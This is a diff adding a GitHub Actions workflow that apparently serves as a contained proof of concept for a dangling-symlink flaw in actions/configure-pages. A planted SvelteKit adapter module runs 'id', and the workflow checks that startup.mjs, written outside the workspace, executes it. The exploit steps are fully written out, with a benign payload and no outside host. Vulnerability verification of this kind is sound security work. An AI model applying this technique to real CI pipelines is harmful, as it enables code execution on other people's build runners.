@@ -1,0 +1,76 @@
+name: configure-pages-svelte-startup
+on:
+  workflow_dispatch: {}
+permissions:
+  contents: read
+  pages: write
+jobs:
+  containment:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    steps:
+      - name: Checkout exact lower fork data commit
+        uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+        with:
+          repository: StealthyBugs/configure-pages-owner-1116191424-f11f
+          ref: 10f7b54fdeeb98149aaa6814ecea1708fef260a0
+          persist-credentials: false
+      - name: Prepare owner standard-module stand-in and controls
+        shell: bash
+        run: |
+          set -euo pipefail
+          protected="$RUNNER_TEMP/configure-pages-critical-462d06411994"
+          package="$protected/node_modules/@sveltejs/adapter-auto"
+          mkdir -p "$package"
+          cat > "$package/package.json" <<'JSON'
+          {"name":"@sveltejs/adapter-auto","version":"0.0.0-owned-proof","type":"module","exports":"./index.js"}
+          JSON
+          cat > "$package/index.js" <<'JS'
+          import {execFileSync} from 'node:child_process'
+          import {writeFileSync} from 'node:fs'
+          export default function adapter() {
+            const result = execFileSync('id', [], {encoding: 'utf8'})
+            writeFileSync(process.env.RUNNER_TEMP + '/configure-pages-svelte-id.txt', result)
+            return {name: 'owned-benign-adapter-proof'}
+          }
+          JS
+          test ! -e "$protected/startup.mjs"
+          test ! -e "$RUNNER_TEMP/configure-pages-svelte-id.txt"
+          pre_result=target-absent
+          echo "SVELTE_STARTUP_PRE=$pre_result"
+      - name: Regular no-link Svelte config control
+        uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d
+        with:
+          token: ${{ github.token }}
+          enablement: false
+          static_site_generator: sveltekit
+          generator_config_file: control/config.mjs
+      - name: Verify no-link control before candidate
+        shell: bash
+        run: |
+          set -euo pipefail
+          protected="$RUNNER_TEMP/configure-pages-critical-462d06411994"
+          test ! -e "$protected/startup.mjs"
+          test ! -e "$RUNNER_TEMP/configure-pages-svelte-id.txt"
+          echo 'REGULAR_CONTROL_CHANGED=true' 'OUTSIDE_UNCHANGED_BEFORE_CANDIDATE=true'
+      - name: Candidate dangling symlink creates owner startup module
+        uses: actions/configure-pages@45bfe0192ca1faeb007ade9deae92b16b8254a0d
+        with:
+          token: ${{ github.token }}
+          enablement: false
+          static_site_generator: sveltekit
+          generator_config_file: lower/startup.mjs
+      - name: Fixed owner Node startup readback
+        shell: bash
+        run: |
+          set -euo pipefail
+          protected="$RUNNER_TEMP/configure-pages-critical-462d06411994"
+          test -s "$protected/startup.mjs"
+          test -L "$GITHUB_WORKSPACE/lower/startup.mjs"
+          test ! -e "$RUNNER_TEMP/configure-pages-svelte-id.txt"
+          grep -Fq "@sveltejs/adapter-auto" "$protected/startup.mjs"
+          node "$protected/startup.mjs"
+          test -s "$RUNNER_TEMP/configure-pages-svelte-id.txt"
+          grep -Eq '^uid=[0-9]+' "$RUNNER_TEMP/configure-pages-svelte-id.txt"
+          execution_result=benign-id
+          echo "SVELTE_STARTUP_RESULT=$execution_result"
